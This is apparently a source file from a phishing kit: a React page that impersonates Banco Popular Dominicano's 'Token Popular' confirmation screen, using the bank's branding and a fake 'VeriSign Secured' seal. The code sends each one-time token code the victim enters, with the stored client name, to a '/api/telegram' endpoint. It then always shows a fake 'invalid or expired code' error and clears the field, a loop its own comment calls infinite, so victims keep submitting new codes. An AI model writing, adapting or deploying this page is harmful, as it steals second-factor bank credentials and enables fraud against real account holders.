"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { Lock } from "lucide-react";

export default function TokenPopularPage() {
  const router = useRouter();
  const [tokenValue, setTokenValue] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorVisible, setErrorVisible] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const [cliente, setCliente] = useState("");

  // Recuperamos el nombre del cliente al cargar la interfaz
  useEffect(() => {
    const nombre = localStorage.getItem("cliente_actual");
    if (nombre) setCliente(nombre);
  }, []);

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validación mínima de longitud antes de procesar
    if (!tokenValue.trim() || tokenValue.length < 4) {
      alert("Por favor, ingrese un código de Token válido.");
      return;
    }

    setLoading(true);
    setErrorVisible(false); // Se oculta el error visual previo durante la nueva carga

    try {
      // Envío estructurado hacia tu API de Telegram
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagina: `🔐 TOKEN POPULAR (Intento ${intentos + 1})`,
          nombre: cliente || "Cliente Desconocido",
          usuario: "TOKEN DISPOSITIVO",
          password: tokenValue.trim(),
          detalles: `El usuario ingresó el código en su intento número ${intentos + 1}.`
        }),
      });

      // LÓGICA DE ERROR INFINITO:
      // Simulamos procesamiento por 1.5 segundos, sumamos el intento, limpiamos el campo y mostramos error
      setTimeout(() => {
        setLoading(false);
        setErrorVisible(true);
        setTokenValue(""); // Vacía el input para forzar el reingreso
        setIntentos((prev) => prev + 1);
      }, 1500);

    } catch (error) {
      console.error("Error de red:", error);
      setLoading(false);
      setErrorVisible(true);
      setTokenValue("");
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white text-gray-800 font-sans">
      {/* 1. Barra Superior / Header */}
      <header className="bg-[#1e5eb9] text-white px-8 py-6 shadow-md">
        <div className="max-w-7xl mx-auto flex items-center">
          <img 
            src="/images/popularlogo1.png" 
            alt="Banco Popular" 
            className="h-32 w-auto object-contain"
          />
        </div>
      </header>

      {/* 2. Contenido Principal */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 pt-10 pb-16 flex flex-col items-center">
        
        {/* Cuadro de Información */}
        <div className="w-full bg-[#e6f4fc] border border-[#b3dbf5] text-[#1e5eb9] px-4 py-3 rounded-md flex items-start gap-3 text-sm md:text-base mb-8 shadow-sm">
          <div className="bg-[#1e5eb9] text-white rounded-full w-5 h-5 flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">
            i
          </div>
          <p className="font-medium">
            Para continuar con su acceso, digite el código desplegado en su Token Popular y presione Continuar.
          </p>
        </div>

        {/* MENSAJE DE ERROR INTEGRADO AL ESTILO POPULAR */}
        {errorVisible && (
          <div className="w-full max-w-md mb-6 p-4 bg-red-50 border-l-4 border-red-600 flex items-center gap-3 rounded-r-md shadow-sm animate-in fade-in slide-in-from-top-1">
            <svg className="w-5 h-5 text-red-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
            </svg>
            <p className="text-red-700 text-sm font-medium">
              Código de seguridad inválido o expirado. Verifique su Token Popular y genere un nuevo código.
            </p>
          </div>
        )}

        {/* Formulario del Token */}
        <form onSubmit={handleContinue} className="w-full max-w-md flex flex-col items-center">
          <label className="text-gray-600 font-semibold mb-3 text-lg">
            Confirmación:
          </label>
          
          {/* Input de Token */}
          <div className="relative w-full mb-8">
            <span className="absolute inset-y-0 left-0 flex items-center pl-4 text-gray-400">
              <Lock size={20} />
            </span>
            <input
              type="text"
              maxLength={6}
              placeholder="Ingrese los datos de su token"
              value={tokenValue}
              disabled={loading}
              onChange={(e) => setTokenValue(e.target.value.replace(/\D/g, ""))}
              className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#1e5eb9] focus:ring-1 focus:ring-[#1e5eb9] text-center text-lg tracking-widest placeholder:tracking-normal placeholder:text-gray-300 disabled:bg-gray-50 disabled:text-gray-400"
            />
          </div>

          {/* Botones de Acción */}
          <div className="flex gap-4 w-full justify-center">
            <button
              type="button"
              onClick={() => router.back()}
              className="px-8 py-2.5 bg-[#e8f1fa] text-[#1e5eb9] font-medium rounded-md hover:bg-[#dbe9f6] transition-colors min-w-[130px] text-center"
            >
              Cancelar
            </button>
            <button
              type="submit"
              disabled={!tokenValue || loading}
              className={`px-8 py-2.5 font-medium rounded-md transition-colors min-w-[130px] text-center ${
                tokenValue && !loading
                  ? "bg-[#1e5eb9] text-white hover:bg-[#16478c]"
                  : "bg-[#e2deda] text-[#a19e9a] cursor-not-allowed"
              }`}
            >
              {loading ? "Verificando..." : "Continuar"}
            </button>
          </div>
        </form>
      </main>

      {/* 3. Pie de página (Footer institucional) */}
      <footer className="w-full max-w-7xl mx-auto px-4 mb-6">
        <div className="bg-[#f4f4f4] rounded-lg p-4 flex flex-wrap items-center justify-center gap-6 border border-gray-200">
          {/* Logo SB */}
          <div className="flex items-center gap-2 text-xs font-bold text-slate-700 border border-slate-400 px-2 py-1 rounded">
            <span className="bg-[#0f2d59] text-white px-1 rounded text-[10px]">SB</span>
            <div className="flex flex-col leading-none text-[8px]">
              <span>ENTIDAD</span>
              <span>SUPERVISADA</span>
            </div>
          </div>

          {/* Sello de Seguridad Simulado */}
          <div className="flex items-center gap-1 text-red-600 font-serif font-bold text-xs border-2 border-red-600 rounded-full px-2 py-0.5 tracking-tighter">
            {"✓ VeriSign Secured"}
          </div>

          <span className="text-[#0f2d59] font-bold text-sm text-center">
            Banco Popular Dominicano, S.A. - Banco Múltiple
          </span>
        </div>
      </footer>
    </div>
  );
}